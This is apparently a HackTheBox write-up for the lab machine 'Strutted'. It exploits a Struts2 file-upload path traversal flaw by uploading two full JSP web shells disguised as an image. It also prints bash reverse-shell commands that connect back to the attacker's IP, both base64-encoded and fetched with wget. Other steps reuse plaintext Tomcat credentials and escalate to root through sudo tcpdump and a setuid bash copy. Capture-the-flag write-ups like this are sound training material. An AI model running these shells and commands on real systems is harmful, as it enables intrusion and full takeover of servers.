---
title: Strutted
tags:
  - HackTheBox
  - Easy
  - Linux
  - CVE
  - File-Upload
  - Sudo-Vulnerability
date: 2025-04-01T00:00:05Z
---
![](Pasted%20image%2020250401101734.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.59 strutted.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- strutted.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http
|_http-title: Strutted\xE2\x84\xA2 - Instant Image Uploads
```

So I checked its website:

![](Pasted%20image%2020250401102035.png)

I downloaded what seems to be the source code of the app from the `download.action` endpoint and inspected it.

Found some credentials inside `tomcat-users.xml`:

![](Pasted%20image%2020250401102304.png)

> Credentials: `admin:skqKY6360z!Y`

It seems to be running Tomcat `9.0`:

![](Pasted%20image%2020250401102412.png)

Inside the `pom.xml` I found the current version of struts2:

![](Pasted%20image%2020250401102733.png)

## Weaponization

So I decided to perform a quick search on CVEs associated to this struts2 version and I found the following web associated to the [CVE-2024-53677](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESTRUTS-8496612).

*Affected versions of this package are vulnerable to Remote Code Execution (RCE) via manipulation of file upload parameters that enable path traversal. When using `FileUploadInterceptor`, uploading of a malicious file is possible, which may then be executed on the server.*

>[!Note]
>*This is only exploitable if the application uses `FileUploadInterceptor`;*

So I found the following [PoC](https://github.com/TAM-K592/CVE-2024-53677-S2-067.git)

![](Pasted%20image%2020250401103923.png)

## Exploitation

I'll capture the uploading action to modify it with CAIDO:

![](Pasted%20image%2020250401103913.png)

We have to take into account that the website only accepts PNG, JPG, JPEG and GIF, so I'll change the `filename` and the MIME Type to one of them.

Now I'll modify the content to upload a `.jsp` as the PoC says:

```shell
------WebKitFormBoundaryvvSfHjpRjxeufqTe
Content-Disposition: form-data; name="upload"; filename="test.jpg"
Content-Type: image/jpeg

ÿØÿà
<%@ page import="java.io.*, java.util.*, java.net.*" %>
<%
    String action = request.getParameter("action");
    String output = "";

    try {
        if ("cmd".equals(action)) {
            // Execute system commands
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output += line + "\n";
                }
                reader.close();
            }
        } else if ("upload".equals(action)) {
            // File upload
            String filePath = request.getParameter("path");
            String fileContent = request.getParameter("content");
            if (filePath != null && fileContent != null) {
                File file = new File(filePath);
                try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                    writer.write(fileContent);
                }
                output = "File uploaded to: " + filePath;
            } else {
                output = "Invalid file upload parameters.";
            }
        } else if ("list".equals(action)) {
            // List directory contents
            String dirPath = request.getParameter("path");
            if (dirPath != null) {
                File dir = new File(dirPath);
                if (dir.isDirectory()) {
                    for (File file : Objects.requireNonNull(dir.listFiles())) {
                        output += file.getName() + (file.isDirectory() ? "/" : "") + "\n";
                    }
                } else {
                    output = "Path is not a directory.";
                }
            } else {
                output = "No directory path provided.";
            }
        } else if ("delete".equals(action)) {
            // Delete files
            String filePath = request.getParameter("path");
            if (filePath != null) {
                File file = new File(filePath);
                if (file.delete()) {
                    output = "File deleted: " + filePath;
                } else {
                    output = "Failed to delete file: " + filePath;
                }
            } else {
                output = "No file path provided.";
            }
        } else {
            // Unknown operation
            output = "Unknown action: " + action;
        }
    } catch (Exception e) {
        output = "Error: " + e.getMessage();
    }

    // Return the result
    response.setContentType("text/plain");
    out.print(output);
%>
------WebKitFormBoundaryvvSfHjpRjxeufqTe
Content-Disposition: form-data; name="top.UploadFileName"

../../shell.jsp
------WebKitFormBoundaryvvSfHjpRjxeufqTe
```

It says that the upload is succesfull:

![](Pasted%20image%2020250401104902.png)

![](Pasted%20image%2020250401110020.png)

Now to call the shell I just have to make a request to `http://strutted.htb/shell.jsp`:

![](Pasted%20image%2020250401110104.png)

![](Pasted%20image%2020250401110119.png)

So now I can craft a reverse shell and send it to gain remote access. I'll use the following one:

```jsp
<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

And I put it inside the request:

![](Pasted%20image%2020250401110917.png)

So now to get the shell I'll first encode it to base64 and the decode it and pipe it to a bash:

```shell
# In my machine
echo 'bash -i >& /dev/tcp/10.10.14.4/666 0>&1 ' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzY2NiAwPiYxIAo=

# In the web shell
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzY2NiAwPiYxIAo=" | base64 -d | bash
```

It didn't work, because it's getting ouputed:

![](Pasted%20image%2020250401111222.png)

So I'll craft a shell in my machine, then download it from the webshell and then execute it.

- First I create my web shell:

```shell
#!/bin/bash 
bash -i >& /dev/tcp/10.10.14.4/666 0>&1
```

- Now I initiate a python server.
- Then I do a `wget` in the webshell to download the shell and execute it:

```shell
wget http://10.10.14.4:8090/shell.sh -O /dev/shm/shell.sh
```

- Now I execute it:

```shell
bash /dev/shm/shell.sh
```

![](Pasted%20image%2020250401111612.png)

> I got a reverse shell :D

## Pivoting

As we've got no permission to read the content of `/home/james`, I'll try to find any credential on the machine. I found a credential inside `/var/lib/tomcat9/conf/tomcat-users.xml`

![](Pasted%20image%2020250401112110.png)

>Credentials: `james:IT14d6SSP81k`

It does not work from inside the machine (doesn't work with `su`), but it works by external ssh.

### User flag

![](Pasted%20image%2020250401112715.png)

## Privilege Escalation

If we run `sudo -l`:

```shell
sudo -l

[redacted]
(ALL) NOPASSWD: /usr/sbin/tcpdump
```

So I checked [GTFOBins](https://gtfobins.github.io/gtfobins/tcpdump/):

```shell
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

So I'll try to modify this PoC to create a copy of the bash console as root:

```shell
COMMAND='cp /bin/bash /tmp/gitblanc; chmod 6777 /tmp/gitblanc'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

![](Pasted%20image%2020250401113244.png)

### Root flag

![](Pasted%20image%2020250401113405.png)

==Machine pwned==







